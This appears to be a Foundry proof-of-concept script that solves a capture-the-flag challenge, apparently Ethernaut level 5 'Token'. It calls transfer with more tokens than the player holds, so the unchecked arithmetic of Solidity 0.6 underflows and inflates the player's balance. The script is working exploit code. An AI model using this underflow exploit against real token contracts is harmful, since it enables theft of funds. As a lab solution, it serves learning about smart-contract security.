//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel05.sol";

contract POC is Script {
    Token token = Token(0x7b0497111Ff63aAC281Cf853b24e27248EFA0761);

    function run() external {
        vm.startBroadcast();
        //check balance
        console.log("Current player balance is: ", token.balanceOf(msg.sender));
        //initiate transfer
        token.transfer(0x4E68FDC0b38E7c85D5bC2CfB518517E7896a3ce3, 21);
        console.log("New balance is: ", token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
